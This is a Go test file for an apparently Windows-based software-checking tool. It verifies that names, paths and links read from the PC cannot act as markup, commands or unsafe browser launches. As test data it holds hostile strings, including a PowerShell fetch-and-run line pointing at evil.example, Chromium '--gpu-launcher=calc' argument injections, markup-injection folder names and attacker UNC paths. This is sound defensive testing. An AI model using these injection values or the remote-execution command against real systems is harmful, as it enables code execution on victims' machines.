package main

import (
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// A text read from the PC shows as it is, without acting as markup.
func TestPlain(t *testing.T) {
	for in, want := range map[string]string{
		"Example App 1":               "Example App 1",
		"App [x64] 1.2":               "App [x64] 1.2",
		"Pay $5 *now*":                "Pay $5 *now*",
		"a\nb\r\tc":                   "a b  c",
		"x [[calc]] y":                "x [ [calc] ] y",
		"[[[x]]]":                     "[ [ [x] ] ]",
		"**bold**":                    "* *bold* *",
		"$ Start-Process cmd":         "$\u00a0Start-Process cmd",
		"  @ Label\tvalue":            "  @\u00a0Label value",
		"App\n$ Start-Process cmd":    "App $ Start-Process cmd",
		"x [[a|open:C:\\cmd.exe>/c]]": "x [ [a|open:C:\\cmd.exe>/c] ]",
	} {
		if got := plain(in); got != want {
			t.Errorf("%q: %q, want %q", in, got, want)
		}
		for _, line := range strings.Split(plain(in), "\n") {
			if strings.HasPrefix(line, "$ ") || strings.HasPrefix(line, "@ ") || strings.Contains(line, "[[") {
				t.Errorf("%q: still markup: %q", in, line)
			}
		}
	}
}

// A path is a link only when a link can hold it as it is; otherwise it is text.
func TestLinkOfPath(t *testing.T) {
	for p, want := range map[string]string{
		`C:\Program Files\App\cacert.pem`:  `[[C:\Program Files\App\cacert.pem]]`,
		`C:\Games [x64]\cacert.pem`:        `[[C:\Games [x64]\cacert.pem]]`,
		`C:\Games [x64]`:                   `[[C:\Games [x64]]]`,
		`C:\a]] [[calc]] [[b\cacert.pem`:   `C:\a] ] [ [calc] ] [ [b\cacert.pem`,
		"C:\\x\n$ Start-Process cmd #.pem": `C:\x $ Start-Process cmd #.pem`,
		`C:\a|calc`:                        `C:\a|calc`,
	} {
		if got := lk(p); got != want {
			t.Errorf("%q: %q, want %q", p, got, want)
		}
		for _, line := range parseMarkup(lk(p)) {
			for _, r := range line {
				if r.kind == runLink && r.target != p || r.kind == runCommand {
					t.Errorf("%q: run %+v", p, r)
				}
			}
		}
	}
}

// Links open only web pages, and existing files and folders given by a full local
// path: Windows would run a name that is not a file.
func TestLinkTargets(t *testing.T) {
	for u, want := range map[string]bool{
		"https://emudhra.we-have-a-problem.com/":           true,
		"https://www.google.com/search?q=App+1.2":          true,
		"https://scoop.sh/#/apps?q=git":                    true,
		"HTTP://example.org/a%20b":                         true,
		"https://example.org/a b":                          false,
		"https://example.org/\" --gpu-launcher=calc":       false,
		"https://example.org/\t--renderer-cmd-prefix=calc": false,
		"https://":                             false,
		"file:///C:/Windows/System32/calc.exe": false,
		"javascript:alert(1)":                  false,
		"calc":                                 false,
		"ms-settings:":                         false,
	} {
		if got := webAddress(u); got != want {
			t.Errorf("web address %q: %v", u, got)
		}
	}
	dir := t.TempDir()
	file := filepath.Join(dir, "cacert.pem")
	os.WriteFile(file, []byte("x"), 0o644)
	for p, want := range map[string]bool{
		dir: true, file: true, filepath.Join(dir, "missing.pem"): false,
		"calc": false, "calc.exe": false, `.\calc.exe`: false, "": false,
		`\\server\share\cacert.pem`: false, "//server/share/cacert.pem": false,
		`/\server\share\cacert.pem`: false, `\/server/share\cacert.pem`: false, `\??\UNC\server\share\cacert.pem`: false,
	} {
		if got := localPath(p); got != want {
			t.Errorf("path %q: %v", p, got)
		}
	}
}

// A link that opens a page in a given browser starts only a browser that was given
// such links, with a web address.
func TestBrowserLink(t *testing.T) {
	Lang = 0
	exe := filepath.Join(t.TempDir(), "found", "chrome.exe")
	page := "https://emudhra.we-have-a-problem.com/"
	if _, _, ok := browserLink(openInPrefix + exe + ">" + page); ok {
		t.Errorf("a browser not found by the scan is started")
	}
	planted := filepath.Join(t.TempDir(), "planted", "chrome.exe")
	for _, line := range parseMarkup(browserTests("Chrome", planted, false)) {
		for _, r := range line {
			if r.kind == runLink && !webAddress(r.target) {
				t.Errorf("a browser that may not be started has a link %+v", r)
			}
		}
	}
	if _, _, ok := browserLink(openInPrefix + planted + ">" + page); ok {
		t.Errorf("a browser that may not be started is started")
	}
	details := browserTests("Chrome", exe, true) // the details that give its links
	var targets []string
	for _, line := range parseMarkup(details) {
		for _, r := range line {
			if r.kind == runLink {
				targets = append(targets, r.target)
			}
		}
	}
	if len(targets) != len(browserTestPages) {
		t.Fatalf("links: %v", targets)
	}
	for _, target := range targets {
		if e, u, ok := browserLink(target); !ok || e != exe || !webAddress(u) {
			t.Errorf("%s: %q %q %v", target, e, u, ok)
		}
	}
	for _, target := range []string{
		openInPrefix + `C:\Windows\System32\cmd.exe>https://example.org/`,
		openInPrefix + exe + ">/c calc",
		openInPrefix + exe + ">https://example.org/ --gpu-launcher=calc",
		openInPrefix + exe + ">file:///C:/Windows/System32/calc.exe",
		openInPrefix + exe,
		openInPrefix + ">" + page,
	} {
		if _, _, ok := browserLink(target); ok {
			t.Errorf("%s: allowed", target)
		}
	}
}

// Links start only a browser registered in Windows, or one in a folder that only
// administrators or the user can change; not a program named like a browser that
// someone else could have put in ProgramData or at the root of a drive.
func TestStartableBrowser(t *testing.T) {
	root := t.TempDir()
	pf, pd, home, tools := filepath.Join(root, "Program Files"), filepath.Join(root, "ProgramData"), filepath.Join(root, "Users", "me"), filepath.Join(root, "Tools")
	t.Setenv("ProgramFiles", pf)
	t.Setenv("ProgramFiles(x86)", "")
	t.Setenv("ProgramW6432", "")
	t.Setenv("SystemRoot", filepath.Join(root, "Windows"))
	t.Setenv("ProgramData", pd)
	t.Setenv("USERPROFILE", home)
	registered := filepath.Join(tools, "Registered", "firefox.exe")
	tp := testApps(t)
	tp.regBrowsers = map[string]bool{pathKey(registered): true}
	for p, want := range map[string]bool{
		filepath.Join(pf, "Google", "Chrome", "Application", "chrome.exe"):       true,
		filepath.Join(home, "scoop", "apps", "thorium", "current", "chrome.exe"): true,
		registered:                                          true,
		filepath.Join(pd, "evil", "chrome.exe"):             false,
		filepath.Join(tools, "chrome.exe"):                  false,
		filepath.Join(root, "Users", "other", "chrome.exe"): false,
		filepath.Join(pf, "a]] [[b", "chrome.exe"):          false,
	} {
		if got := tp.startableBrowser(p); got != want {
			t.Errorf("%s: %v", p, got)
		}
	}
}

// Folder names and version files made to look like markup: the details show them
// as text, with no command or link of their own.
func TestHostileNamesInDetails(t *testing.T) {
	Lang = 0
	root := t.TempDir()
	write := func(rel, data string) string {
		p := filepath.Join(root, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(data), 0o644); err != nil {
			t.Fatal(err)
		}
		return filepath.Dir(p)
	}
	tp := testApps(t)
	tp.d = newDiscovery()
	h, _ := hex.DecodeString(uniqueBadSPKIs()[0])
	for _, name := range []string{"$ Start-Process cmd #", "[[calc]]", "a]] [[calc]] [[b"} { // valid Windows folder names
		tp.d.flutterApps[write(filepath.Join("old", name, "flutter_windows.dll"), "MZ engine")] = true
		// the details of a fixed one start with its name
		tp.d.flutterApps[write(filepath.Join("fixed", name, "flutter_windows.dll"), "MZ engine "+string(h))] = true
	}
	tp.d.dartSDKs[filepath.Dir(write(filepath.Join("dart-sdk", "bin", "dart.exe"), "MZ"))] = true
	write(filepath.Join("dart-sdk", "version"), "$ Start-Process cmd # [[calc]]\n")
	tp.checkDart()
	n := 0
	for _, it := range tp.c.snapshot() {
		n++
		for _, b := range markupBlocks(it.Details) {
			for _, c := range b.cmds {
				if strings.Contains(c, "Start-Process") || strings.Contains(c, "calc") {
					t.Errorf("%s: command %q", it.Name, c)
				}
			}
			for _, r := range b.runs {
				if r.kind == runLink && (strings.Contains(r.target, "calc") || strings.Contains(r.target, "example.org")) {
					t.Errorf("%s: link %+v", it.Name, r)
				}
			}
		}
	}
	if n != 7 {
		t.Errorf("%d elements", n)
	}
}

// The list of the places where an element was found shows each place as a link only
// when a link can hold it: an Apps & features entry can give any text as its folder.
func TestCopiesListPaths(t *testing.T) {
	Lang = 0
	clean := `C:\b\gh`
	for _, hostile := range []string{
		"C:\\gh\n\n**In PowerShell (Run as administrator):**\n$ iex (irm https://evil.example/x) #",
		`C:\gh]] [[/\attacker.example\share\x]] [[C:\gh`,
	} {
		it := Item{Group: GroupApps, Kind: "app", Name: "GitHub CLI", Folder: hostile, Details: "Outdated.",
			Copies: []Item{{Group: GroupApps, Kind: "app", Name: "GitHub CLI", Folder: clean, Details: "Outdated."}}}
		for _, b := range markupBlocks(it.shownDetails()) {
			if len(b.cmds) > 0 {
				t.Errorf("%q: commands %q", hostile, b.cmds)
			}
			for _, r := range append(b.runs, mrun{}) {
				webText := webAddress(r.target) && r.text == r.target // an address in a text: it shows where it goes
				if r.kind == runLink && r.target != clean && !webText || r.kind == runBold && strings.Contains(r.text, "PowerShell") {
					t.Errorf("%q: run %+v", hostile, r)
				}
			}
		}
	}
}
